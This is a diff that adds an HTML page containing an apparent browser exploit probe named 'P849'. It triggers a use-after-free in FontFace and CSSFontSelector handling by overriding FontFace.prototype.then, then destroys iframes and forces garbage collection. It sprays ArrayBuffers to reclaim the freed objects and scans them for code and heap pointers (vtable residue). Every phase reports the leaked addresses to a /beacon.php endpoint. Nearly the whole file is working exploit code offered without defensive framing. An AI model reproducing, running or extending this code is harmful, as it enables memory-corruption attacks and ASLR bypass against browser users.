@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P849</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:11px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:6px;border-radius:4px;white-space:pre-wrap;word-break:break-all;max-height:93vh;overflow-y:auto;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P849: Iframe CSSFontSelector Vtable Hunt</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P849-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+function hexQ(v){return '0x'+v.toString(16).padStart(16,'0');}
+function classifyPtr(v){
+  if(v===BigInt(0))return 'Z';
+  var hi=Number(v>>BigInt(32));
+  if(hi>=0xFFFF8000)return 'K';
+  if(hi>=0x10&&hi<=0x1000)return 'H';
+  if(hi===0&&Number(v&BigInt(0xFFFFFFFF))>0x10000)return 'C';
+  if(hi>0&&hi<0x10)return 'C';
+  if(v<BigInt(0x10000))return 'S';
+  return '?';
+}
+
+bn('BOOT','start');
+log('Iframe CSSFontSelector vtable hunt starting...','info');
+log('Strategy: destroy iframe Document → CSSFontSelector freed → AB reclaim → vtable residue','info');
+log('','');
+
+/* ===================================================================
+   PHASE A: Main page FontFace UAF — get q13 baseline
+   (also proves UAF works, gives us heap reference)
+   =================================================================== */
+
+var mainAB=null, mainQ13=BigInt(0), mainH=BigInt(0);
+
+var stM=document.createElement('style');
+stM.textContent="@font-face{font-family:bbM;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(stM);
+
+var faceM=new FontFace('fM',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(faceM);
+void faceM.loaded;
+
+var mFired=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(mFired)return undefined;
+    mFired=true;
+    if(stM){stM.remove();stM.textContent='';stM=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    var mABs=[];
+    for(var i=0;i<80;i++)mABs.push(new ArrayBuffer(192));
+    try{document.fonts.check('1em bbM');}catch(e){}
+    document.body.offsetHeight;
+    window.__mABs=mABs;
+    return undefined;
+  },set:function(){}
+});
+
+document.fonts.load('1em fM, bbM','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  var mABs=window.__mABs||[];
+  for(var i=0;i<mABs.length;i++){
+    var bu=new BigUint64Array(mABs[i]);
+    for(var j=0;j<bu.length;j++){
+      if(bu[j]!==BigInt(0)){mainAB=mABs[i];break;}
+    }
+    if(mainAB)break;
+  }
+
+  if(!mainAB){
+    log('Main page UAF: MISS','fail');
+    bn('A-MISS','no-main-hit');
+    startPhaseB();
+    return;
+  }
+
+  var mBU=new BigUint64Array(mainAB);
+  mainH=mBU[11]-BigInt(0x68);
+  mainQ13=mBU[13];
+  log('--- PHASE A: Main page baseline ---','ok');
+  log('H = '+hexQ(mainH),'ok');
+  log('q13 = '+hexQ(mainQ13)+' (main CSSFontSelector*)','ok');
+  bn('A-HIT','H='+hexQ(mainH)+'|q13='+hexQ(mainQ13));
+  startPhaseB();
+
+},300);
+
+function startPhaseB(){
+  /* ===================================================================
+     PHASE B: Create iframe, get ITS q13, then DESTROY iframe
+
+     Key: the iframe has its own Document → its own CSSFontSelector.
+     When we destroy the iframe, Document ref drops → CSSFontSelector freed.
+     CSSFontSelector IS VIRTUAL → vtable at [addr+0] = CODE POINTER.
+     =================================================================== */
+  log('','');
+  log('--- PHASE B: Iframe creation + UAF ---','hot');
+
+  var iframe=document.createElement('iframe');
+  iframe.style.cssText='width:1px;height:1px;position:absolute;top:-9999px;';
+  document.body.appendChild(iframe);
+
+  setTimeout(function(){
+    var iDoc=iframe.contentDocument;
+    if(!iDoc){
+      log('No iframe document!','fail');
+      bn('B-FAIL','no-idoc');
+      startPhaseC(BigInt(0));
+      return;
+    }
+
+    /* Add multiple @font-face rules in the iframe */
+    var iStyle=iDoc.createElement('style');
+    iStyle.textContent="@font-face{font-family:iBB;src:local(Arial);unicode-range:U+0042;}";
+    iDoc.head.appendChild(iStyle);
+
+    /* We need a body for layout */
+    if(!iDoc.body){
+      var b=iDoc.createElement('body');
+      iDoc.documentElement.appendChild(b);
+    }
+
+    var iFace=new FontFace('iF',"local('Helvetica')",{unicodeRange:'U+0045'});
+    iDoc.fonts.add(iFace);
+    void iFace.loaded;
+
+    var iFired=false;
+    Object.defineProperty(FontFace.prototype,'then',{
+      configurable:true,
+      get:function(){
+        if(iFired)return undefined;
+        iFired=true;
+        if(iStyle){iStyle.remove();iStyle.textContent='';iStyle=null;}
+        try{iDoc.fonts.delete(this);}catch(e){}
+        try{iDoc.body.offsetHeight;}catch(e){}
+        var iABs=[];
+        for(var i=0;i<80;i++)iABs.push(new ArrayBuffer(192));
+        try{iDoc.fonts.check('1em iBB');}catch(e){}
+        try{iDoc.body.offsetHeight;}catch(e){}
+        window.__iABs=iABs;
+        return undefined;
+      },set:function(){}
+    });
+
+    iDoc.fonts.load('1em iF, iBB','CD');
+
+    setTimeout(function(){
+      delete FontFace.prototype.then;
+
+      var iABs=window.__iABs||[];
+      var iHit=null;
+      var iframeQ13=BigInt(0);
+
+      for(var i=0;i<iABs.length;i++){
+        var bu=new BigUint64Array(iABs[i]);
+        for(var j=0;j<bu.length;j++){
+          if(bu[j]!==BigInt(0)){iHit=iABs[i];break;}
+        }
+        if(iHit)break;
+      }
+
+      if(!iHit){
+        log('Iframe FontFace UAF: MISS','fail');
+        bn('B-MISS','iframe-uaf-miss');
+        /* Still try phase C with main q13 */
+        startPhaseC(mainQ13);
+        return;
+      }
+
+      var iBU=new BigUint64Array(iHit);
+      var iH=iBU[11]-BigInt(0x68);
+      iframeQ13=iBU[13];
+      log('Iframe UAF HIT!','ok');
+      log('iH = '+hexQ(iH),'ok');
+      log('iQ13 = '+hexQ(iframeQ13)+' (iframe CSSFontSelector*)','ok');
+      log('Same as main? '+(iframeQ13===mainQ13?'YES (shared!)':'NO (different)'),'info');
+      bn('B-HIT','iH='+hexQ(iH)+'|iQ13='+hexQ(iframeQ13)+'|same='+(iframeQ13===mainQ13));
+
+      startPhaseC(iframeQ13);
+    },400);
+  },200);
+}
+
+function startPhaseC(targetQ13){
+  /* ===================================================================
+     PHASE C: Destroy iframe completely → free CSSFontSelector
+     Then spray AB at multiple sizes to reclaim → read vtable residue
+     =================================================================== */
+  log('','');
+  log('--- PHASE C: Iframe destruction + reclaim ---','hot');
+  log('Target: CSSFontSelector at '+hexQ(targetQ13),'info');
+
+  /* Remove iframe from DOM */
+  var iframes=document.querySelectorAll('iframe');
+  for(var i=0;i<iframes.length;i++){
+    iframes[i].remove();
+  }
+
+  /* Null all references */
+  /* (iframe var is in startPhaseB scope, goes out of scope) */
+
+  /* GC pressure round 1: allocate and discard lots of objects */
+  log('  GC pressure round 1...','info');
+  for(var gc=0;gc<10;gc++){
+    var trash=[];
+    for(var i=0;i<5000;i++)trash.push({a:i,b:new Array(8),c:String(i)});
+    trash=null;
+  }
+
+  /* GC pressure round 2: string allocation/free */
+  for(var gc=0;gc<5;gc++){
+    var strs=[];
+    for(var i=0;i<1000;i++)strs.push('x'.repeat(256)+i);
+    strs=null;
+  }
+
+  /* GC pressure round 3: AB allocation/free (different sizes from spray) */
+  for(var gc=0;gc<3;gc++){
+    var abTrash=[];
+    for(var i=0;i<200;i++)abTrash.push(new ArrayBuffer(1024));
+    abTrash=null;
+  }
+
+  bn('C-GC','3rounds');
+
+  /* Wait for GC to actually run */
+  setTimeout(function(){
+    log('  Post-GC spray starting...','info');
+
+    /* Spray AB at many sizes to reclaim CSSFontSelector */
+    /* CSSFontSelector size unknown — try 16 sizes from 64 to 1024 */
+    var sizes=[64,80,96,112,128,160,192,224,256,320,384,448,512,640,768,1024];
+    var sprayABs={};
+    for(var si=0;si<sizes.length;si++){
+      var sz=sizes[si];
+      sprayABs[sz]=[];
+      for(var i=0;i<80;i++)sprayABs[sz].push(new ArrayBuffer(sz));
+    }
+
+    bn('C-SPRAY','16sizes');
+
+    /* Scan ALL ABs for code-range pointers (vtable residue) */
+    var cHits=[];
+    var cCodeHits=[];
+
+    for(var si=0;si<sizes.length;si++){
+      var sz=sizes[si];
+      var arr=sprayABs[sz];
+      var nz=0,cc=0,hc=0;
+      for(var i=0;i<arr.length;i++){
+        var bu=new BigUint64Array(arr[i]);
+        var hasNZ=false;
+        for(var j=0;j<bu.length;j++){
+          if(bu[j]!==BigInt(0)){
+            hasNZ=true;
+            var cls=classifyPtr(bu[j]);
+            if(cls==='C'){
+              cc++;
+              cCodeHits.push({sz:sz,idx:i,qw:j,val:bu[j],off:j*8});
+            }
+            if(cls==='H')hc++;
+          }
+        }
+        if(hasNZ)nz++;
+      }
+      if(nz>0){
+        cHits.push('sz'+sz+'='+nz+'(c'+cc+',h'+hc+')');
+        log('  AB('+sz+'): '+nz+' hit, '+cc+' CODE, '+hc+' HEAP',cc?'hot':(nz?'ok':''));
+      }
+    }
+
+    if(cHits.length===0){
+      log('  Post-iframe spray: ALL ZEROED','fail');
+      bn('C-MISS','all-zero');
+    } else {
+      bn('C-HITS',cHits.join('|'));
+
+      if(cCodeHits.length>0){
+        log('','');
+        log('  *** CODE POINTERS (potential vtable)! ***','hot');
+        for(var ci=0;ci<cCodeHits.length&&ci<20;ci++){
+          var ch=cCodeHits[ci];
+          log('    AB('+ch.sz+')['+ch.idx+'] q'+ch.qw+' +0x'+(ch.off).toString(16)+' = '+hexQ(ch.val),'hot');
+        }
+        bn('C-CODE',cCodeHits.slice(0,10).map(function(c){
+          return 'sz'+c.sz+'+0x'+c.off.toString(16)+'='+hexQ(c.val);
+        }).join('|'));
+      }
+    }
+
+    /* ===================================================================
+       PHASE D: Second GC wave + second spray
+       Maybe the first spray wasn't enough. More GC + spray again.
+       =================================================================== */
+    log('','');
+    log('--- PHASE D: Second wave ---','hot');
+
+    /* More GC pressure */
+    for(var gc=0;gc<5;gc++){
+      var trash2=[];
+      for(var i=0;i<3000;i++)trash2.push(new Float64Array(16));
+      trash2=null;
+    }
+
+    setTimeout(function(){
+      var d2ABs={};
+      for(var si=0;si<sizes.length;si++){
+        var sz=sizes[si];
+        d2ABs[sz]=[];
+        for(var i=0;i<60;i++)d2ABs[sz].push(new ArrayBuffer(sz));
+      }
+
+      var d2Hits=[];
+      var d2Code=[];
+
+      for(var si=0;si<sizes.length;si++){
+        var sz=sizes[si];
+        var arr=d2ABs[sz];
+        var nz=0,cc=0;
+        for(var i=0;i<arr.length;i++){
+          var bu=new BigUint64Array(arr[i]);
+          for(var j=0;j<bu.length;j++){
+            if(bu[j]!==BigInt(0)){
+              nz++;
+              var cls=classifyPtr(bu[j]);
+              if(cls==='C'){cc++;d2Code.push({sz:sz,qw:j,val:bu[j]});}
+              break;
+            }
+          }
+        }
+        if(nz>0)d2Hits.push('sz'+sz+'='+nz+'(c'+cc+')');
+      }
+
+      if(d2Hits.length>0){
+        log('  Wave 2: '+d2Hits.join(', '),d2Code.length?'hot':'ok');
+        bn('D-HITS',d2Hits.join('|'));
+        if(d2Code.length>0){
+          log('  *** WAVE 2 CODE POINTERS! ***','hot');
+          for(var ci=0;ci<d2Code.length&&ci<10;ci++){
+            log('    sz'+d2Code[ci].sz+' q'+d2Code[ci].qw+' = '+hexQ(d2Code[ci].val),'hot');
+          }
+          bn('D-CODE',d2Code.slice(0,5).map(function(c){return hexQ(c.val);}).join('|'));
+        }
+      } else {
+        log('  Wave 2: all zeroed','fail');
+        bn('D-MISS','zero');
+      }
+
+      /* ===================================================================
+         PHASE E: Multiple iframe creation + destruction
+         Create 5 iframes at once, each with @font-face.
+         Destroy all → 5x CSSFontSelectors freed → better odds.
+         =================================================================== */
+      log('','');
+      log('--- PHASE E: 5x iframe burst ---','hot');
+
+      var iframes5=[];
+      for(var k=0;k<5;k++){
+        var ifr=document.createElement('iframe');
+        ifr.style.cssText='width:1px;height:1px;position:absolute;top:-9999px;';
+        document.body.appendChild(ifr);
+        iframes5.push(ifr);
+      }
+
+      setTimeout(function(){
+        /* Add @font-face to each iframe */
+        for(var k=0;k<iframes5.length;k++){
+          var id=iframes5[k].contentDocument;
+          if(!id)continue;
+          var ist=id.createElement('style');
+          ist.textContent="@font-face{font-family:xf"+k+";src:local(Arial);unicode-range:U+00"+(0x70+k).toString(16)+";font-weight:"+(200+k*100)+";}";
+          id.head.appendChild(ist);
+          try{id.body.offsetHeight;}catch(e){}
+        }
+
+        /* Destroy all 5 iframes */
+        for(var k=0;k<iframes5.length;k++){
+          iframes5[k].remove();
+        }
+        iframes5=null;
+
+        /* Aggressive GC */
+        for(var gc=0;gc<15;gc++){
+          var t3=[];
+          for(var i=0;i<3000;i++)t3.push({x:new Array(4)});
+          t3=null;
+        }
+
+        setTimeout(function(){
+          /* Final spray */
+          var eSizes=[64,96,128,160,192,224,256,320,384,512,768];
+          var eABs={};
+          for(var si=0;si<eSizes.length;si++){
+            var sz=eSizes[si];
+            eABs[sz]=[];
+            for(var i=0;i<100;i++)eABs[sz].push(new ArrayBuffer(sz));
+          }
+
+          var eHits=[];
+          var eCode=[];
+
+          for(var si=0;si<eSizes.length;si++){
+            var sz=eSizes[si];
+            var arr=eABs[sz];
+            var nz=0,cc=0,hc=0;
+            for(var i=0;i<arr.length;i++){
+              var bu=new BigUint64Array(arr[i]);
+              for(var j=0;j<bu.length;j++){
+                if(bu[j]!==BigInt(0)){
+                  nz++;
+                  var cls=classifyPtr(bu[j]);
+                  if(cls==='C'){cc++;eCode.push({sz:sz,qw:j,val:bu[j],off:j*8});}
+                  if(cls==='H')hc++;
+                  break;
+                }
+              }
+            }
+            if(nz>0)eHits.push('sz'+sz+'='+nz+'(c'+cc+',h'+hc+')');
+          }
+
+          if(eHits.length>0){
+            log('  5x iframe burst: '+eHits.join(', '),eCode.length?'hot':'ok');
+            bn('E-HITS',eHits.join('|'));
+            if(eCode.length>0){
+              log('','');
+              log('  *** 5x IFRAME CODE POINTERS! ***','hot');
+              for(var ci=0;ci<eCode.length&&ci<15;ci++){
+                var ch=eCode[ci];
+                log('    AB('+ch.sz+') q'+ch.qw+' +0x'+ch.off.toString(16)+' = '+hexQ(ch.val),'hot');
+              }
+              bn('E-CODE',eCode.slice(0,8).map(function(c){return 'sz'+c.sz+'+'+c.off+'='+hexQ(c.val);}).join('|'));
+            }
+          } else {
+            log('  5x iframe burst: all zeroed','fail');
+            bn('E-MISS','zero');
+          }
+
+          log('','');
+          log('====== P849 COMPLETE ======','hot');
+          bn('DONE','complete');
+        },300);
+      },100);
+    },200);
+  },200);
+}
+</script></body></html>
